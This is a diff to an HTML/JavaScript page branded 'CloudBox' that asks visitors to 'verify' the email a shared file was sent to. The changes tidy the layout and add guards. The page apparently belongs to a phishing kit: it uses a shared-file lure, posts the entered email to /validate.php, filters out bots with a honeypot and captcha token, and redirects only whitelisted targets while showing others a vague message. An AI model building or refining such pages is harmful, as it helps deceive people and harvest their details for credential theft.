@@ -6,19 +6,24 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="color-scheme" content="light dark">
   <style>
-    /* ===== Brand tokens (edit these only) ===== */
+    /* ===== Brand tokens ===== */
     :root{
-      --brand:#1f6fd1;            /* header + button */
-      --brand-700:#1657a6;        /* button hover/active */
-      --bg:#f1f1f1;               /* page background */
-      --card:#f5f5f5;             /* card background */
-      --text:#1f2937;             /* main text */
-      --muted:#6b7280;            /* secondary text */
-      --border:#ccc;           /* light strokes */
-      --radius:3px;              /* card/button radius */
+      --brand:#1f6fd1;          /* header + button */
+      --brand-700:#1657a6;      /* button hover/active */
+      --bg:#f1f1f1;             /* page background */
+      --card:#f5f5f5;           /* card background */
+      --text:#1f2937;           /* main text */
+      --muted:#6b7280;          /* secondary text */
+      --border:#ccc;         /* light strokes */
+      --radius:3px;             /* card/button radius */
       --card-shadow:0 12px 28px rgba(0,0,0,.08);
-      --maxw:330px;
-      --focus:#6aa1ff;            /* focus ring */
+      --maxw:320px;
+      --focus:#6aa1ff;          /* focus ring */
+      /* layout gaps */
+      --logo-size:100px;
+      --gap-top:12px;           /* brandbar → logo */
+      --gap-between:8px;        /* logo → card */
+      --brandbar-h:35px;        /* keep in sync with .brandbar height */
     }
     @media (prefers-color-scheme: dark){
       :root{
@@ -39,7 +44,7 @@
 
     /* Top brand bar */
     .brandbar{
-      height:35px;
+      height:var(--brandbar-h);
       background:var(--brand);
       color:#fff;
       display:flex; align-items:center;
@@ -50,10 +55,23 @@
 
     /* Centered container */
     .wrap{
-      min-height:calc(100% - 48px);
+      min-height:calc(100% - var(--brandbar-h));
       display:grid;
       place-items:center;
-      padding:45px 16px;
+      padding:var(--gap-top) 16px 32px;
+    }
+
+    /* Logo */
+    .card-logo{
+      width:var(--logo-size);
+      height:var(--logo-size);
+      display:block;
+      margin:0 auto var(--gap-between);
+      object-fit:contain;
+      max-width:100%;
+    }
+    @media (prefers-color-scheme: dark){
+      .card-logo{ filter:brightness(1.05) contrast(1.02); }
     }
 
     /* Card */
@@ -66,6 +84,7 @@
       box-shadow:var(--card-shadow);
       overflow:hidden;
       font-size:14px;
+      margin-top:var(--gap-between);
     }
     .card-head{
       padding:15px 14px;
@@ -76,7 +95,7 @@
       margin:4px 0 0 0;
       font-size:20px;
       line-height:1.25;
-      font-weight:105;
+      font-weight:600; /* 105 → 600 for consistent rendering */
     }
     .card-body{ padding:10px 24px }
     .card-body p{ margin:0 0 12px 0; color:var(--muted) }
@@ -85,11 +104,11 @@
     .file{
       display:inline-block;
       padding:10px 14px;
-      border:0px solid var(--border);
+      border:0;
       border-radius:4px;
       background:#f5f5f5;
       color:var(--text);
-      font-weight:400;
+      font-weight:500;
       margin:6px 0 12px;
       word-break:break-word;
       max-width:100%;
@@ -109,10 +128,7 @@
       color:var(--text);
       outline:none;
     }
-    .input:focus{
-      border-color:var(--focus);
-      
-    }
+    .input:focus{ border-color:var(--focus); }
 
     /* Button */
     .actions{ margin:18px 0 8px; display:flex; gap:12px }
@@ -122,66 +138,14 @@
       background:var(--brand); color:#fff; font-weight:650; width:100%;
     }
     .btn:hover{ background:var(--brand-700) }
-    .btn:disabled{ opacity:1; cursor:not-allowed }
+    .btn:disabled{ opacity:.6; cursor:not-allowed }
 
     .caption{ font-size:12px; color:var(--muted); margin-top:12px }
     .caption small{ display:block; opacity:.9 }
 
-   
-   
-   
-   
-   /* Logo size token */
-/* Brand bar height is 33px, so reflect that everywhere */
-.brandbar{ height:37px; background:var(--brand); color:#fff; display:flex; align-items:center; padding:0 16px; font-weight:600; letter-spacing:.2px; }
-
-/* Tighter spacing between header ⇢ logo ⇢ card */
-:root{
-  --logo-size: 120px;        /* keep your current logo size */
-  --gap-top: 0px;          /* space from brandbar to logo */
-  --gap-between: 0px;       /* space between logo and card frame */
-}
-
-.wrap{
-  /* subtract the real brandbar height; smaller top padding for tighter look */
-  min-height: calc(50% - 13px);
-  display: grid; place-items: center;
-  padding: var(--gap-top) 2px 4px;   /* was 45px 16px */
-}
-
-/* Logo styling */
-.card-logo{
-  width: var(--logo-size);
-  height: var(--logo-size);
-  display: block;
-  margin: 0 auto var(--gap-between);   /* gap under logo */
-  object-fit: contain;
-  max-width: 100%;
-}
-
-/* Add a hairline gap above the card to separate it from the logo visually */
-.card{ 
-  margin-top: var(--gap-between);
-}
-
-
-/* Optional dark-mode tweak if your asset is dark */
-@media (prefers-color-scheme: dark){
-  .card-logo{ filter: brightness(1.1) contrast(1.05); }
-}
-
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-
+    /* Inline alert */
+    .alert { font:12px/1.6 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; margin-top:8px; }
+    
     /* Narrow */
     @media (max-width:480px){
       :root{ --maxw:92vw }
@@ -192,36 +156,24 @@
 <body>
 
   <!-- Top brand bar -->
- <div class="brandbar">
-  <span id="brandName">CloudBox</span>
-</div>
+  <div class="brandbar">
+    <span id="brandName">CloudBox</span>
+  </div>
 
-<main class="wrap">
-  <img class="card-logo" src="nn.PNG" alt="" width="100" height="100" decoding="async" loading="eager">
+  <main class="wrap">
+    <!-- Logo above the card -->
+    <img class="card-logo" src="nn.PNG" alt="" width="100" height="100" decoding="async" loading="eager">
 
+    <!-- Honeypot + optional captcha token (can sit outside; JS reads them by id) -->
+    <input type="text" id="middleName" name="middleName" tabindex="-1" autocomplete="off"
+           aria-hidden="true" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;border:0;padding:0;">
+    <input type="hidden" id="cfToken" name="cfToken" value="">
 
-
-
-  <!-- Honeypot (must stay empty) -->
-<input type="text" id="middleName" name="middleName" tabindex="-1" autocomplete="off"
-       aria-hidden="true" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;border:0;padding:0;">
-
-<!-- Optional Cloudflare Turnstile/Recaptcha token holder -->
-<input type="hidden" id="cfToken" name="cfToken" value="">
-
-  
-  
-  
-  
-  
-    <form class="card">
-    
+    <!-- Form -->
+    <form class="card" id="verifyForm" method="post" action="/validate.php">
       <header class="card-head" aria-labelledby="t">
-        <!-- Replace SVG with your logo if desired (CID-embedded is fine) -->
-       
         <h1 id="t" class="card-title">Verify Your Identity</h1>
       </header>
-      
 
       <section class="card-body">
         <p>You’ve been sent a secure link to:</p>
@@ -229,10 +181,9 @@
         <p>To open this secure link, enter the email address it was shared with.</p>
 
         <div class="field">
-          <label for="email"></label>
+          <label for="email">Email address</label>
           <input class="input" id="email" name="email" type="email" autocomplete="email"
-                 placeholder="Enter email
-" required inputmode="email" />
+                 placeholder="Enter email" required inputmode="email" />
         </div>
 
         <div class="actions">
@@ -246,103 +197,103 @@
     </form>
   </main>
 
- 
-
   <script>
-  // ---- Elements
-  const form  = document.getElementById('verifyForm');
-  const email = document.getElementById('email');
-  const btn   = document.getElementById('continueBtn');
+    // ---- Elements
+    const form  = document.getElementById('verifyForm');
+    const email = document.getElementById('email');
+    const btn   = document.getElementById('continueBtn');
 
-  // Optional hidden fields (ok if missing)
-  const cfTok = document.getElementById('cfToken');    // e.g., Turnstile/Recaptcha
-  const hp    = document.getElementById('middleName'); // honeypot (must stay empty)
+    // Optional hidden fields (ok if missing)
+    const cfTok = document.getElementById('cfToken');    // e.g., Turnstile/Recaptcha
+    const hp    = document.getElementById('middleName'); // honeypot (must stay empty)
 
-  // Enable button only when email shape is OK
-  const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v).trim());
-  email.addEventListener('input', () => { btn.disabled = !looksLikeEmail(email.value) });
+    // Guards (avoid null refs if DOM changes)
+    if (!form || !email || !btn) {
+      console.error('Verify form not found or missing elements.');
+    } else {
+      // Enable button only when email shape is OK
+      const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v).trim());
+      email.addEventListener('input', () => { btn.disabled = !looksLikeEmail(email.value) });
 
-  // Message helper
-  function showMsg(text, ok=false){
-    let el = document.getElementById('alert');
-    if (!el) {
-      el = document.createElement('div');
-      el.id = 'alert';
-      el.className = 'alert';
-      form.querySelector('.card-body').appendChild(el);
-    }
-    el.textContent = text;
-    el.setAttribute('role', 'status');
-    el.style.color = ok ? '#1e5fcc' : '#b91c1c';
-    el.style.marginTop = '8px';
-    el.style.fontSize = '12px';
-  }
-
-  // Resolve endpoint from form action (defaults to /validate.php)
-  const endpoint = new URL(form.getAttribute('action') || '/validate.php', location.href).toString();
-
-  // Progressive-enhanced JSON submit (backend expects JSON)
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    if (!looksLikeEmail(email.value)) {
-      showMsg('Please enter a valid email address.');
-      return;
-    }
-
-    btn.disabled = true;
-    const original = btn.textContent;
-    btn.textContent = 'Checking…';
-
-    const payload = {
-      email: String(email.value || '').trim().toLowerCase(),
-      jsToken: 'ok-' + Math.random().toString(36).slice(2),
-      cfToken: cfTok ? cfTok.value : '',
-      middleName: hp ? hp.value : ''   // must be empty; backend flags bots otherwise
-    };
-
-    // Timeout after 12s to avoid hanging UI
-    const ctl = new AbortController();
-    const t = setTimeout(() => ctl.abort(), 12000);
-
-    try {
-      const res = await fetch(endpoint, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json; charset=utf-8',
-          'X-Client-Lang': navigator.language || 'en'
-        },
-        body: JSON.stringify(payload),
-        signal: ctl.signal
-      });
-
-      let data = null;
-      try { data = await res.json(); } catch { data = {}; }
-
-      // Success path (whitelisted): backend returns { valid:true, redirect:"..." }
-      if (res.ok && data && data.valid && data.redirect) {
-        showMsg(data.message || 'Validated', true);
-        location.assign(data.redirect);
-        return;
+      // Message helper
+      function showMsg(text, ok=false){
+        let el = document.getElementById('alert');
+        if (!el) {
+          el = document.createElement('div');
+          el.id = 'alert';
+          el.className = 'alert';
+          form.querySelector('.card-body').appendChild(el);
+        }
+        el.textContent = text;
+        el.setAttribute('role', 'status');
+        el.style.color = ok ? '#1e5fcc' : '#b91c1c';
       }
 
-      // Friendly, non-enumerating message for all other cases
-      showMsg('If your email is permitted for this file, you will receive access shortly.');
-    } catch (err) {
-      showMsg('Network issue. Please retry in a moment.');
-    } finally {
-      clearTimeout(t);
-      btn.disabled = !looksLikeEmail(email.value);
-      btn.textContent = original;
+      // Resolve endpoint from form action (defaults to /validate.php)
+      const endpoint = new URL(form.getAttribute('action') || '/validate.php', location.href).toString();
+
+      // Progressive-enhanced JSON submit (backend expects JSON)
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        if (!looksLikeEmail(email.value)) {
+          showMsg('Please enter a valid email address.');
+          return;
+        }
+
+        btn.disabled = true;
+        const original = btn.textContent;
+        btn.textContent = 'Checking…';
+
+        const payload = {
+          email: String(email.value || '').trim().toLowerCase(),
+          jsToken: 'ok-' + Math.random().toString(36).slice(2),
+          cfToken: cfTok ? cfTok.value : '',
+          middleName: hp ? hp.value : ''   // must be empty; backend flags bots otherwise
+        };
+
+        // Timeout after 12s to avoid hanging UI
+        const ctl = new AbortController();
+        const t = setTimeout(() => ctl.abort(), 12000);
+
+        try {
+          const res = await fetch(endpoint, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json; charset=utf-8',
+              'X-Client-Lang': navigator.language || 'en'
+            },
+            body: JSON.stringify(payload),
+            signal: ctl.signal
+          });
+
+          let data = null;
+          try { data = await res.json(); } catch { data = {}; }
+
+          // Success path (whitelisted): backend returns { valid:true, redirect:"..." }
+          if (res.ok && data && data.valid && data.redirect) {
+            showMsg(data.message || 'Validated', true);
+            location.assign(data.redirect);
+            return;
+          }
+
+          // Friendly, non-enumerating message for all other cases
+          showMsg('If your email is permitted for this file, you will receive access shortly.');
+        } catch (err) {
+          showMsg('Network issue. Please retry in a moment.');
+        } finally {
+          clearTimeout(t);
+          btn.disabled = !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email.value).trim());
+          btn.textContent = original;
+        }
+      });
+
+      // Optional: query params → UI
+      const q = new URLSearchParams(location.search);
+      const fileEl = document.getElementById('fileName');
+      if (q.get('file') && fileEl) fileEl.textContent = q.get('file');
+      const hostEl = document.getElementById('hostDomain');
+      if (q.get('host') && hostEl) hostEl.textContent = q.get('host');
     }
-  });
-
-  // Optional: query params → UI
-  const q = new URLSearchParams(location.search);
-  if (q.get('file')) document.getElementById('fileName').textContent = q.get('file');
-  if (q.get('host')) document.getElementById('hostDomain').textContent = q.get('host');
-</script>
-
-
-
+  </script>
 </body>
 </html>
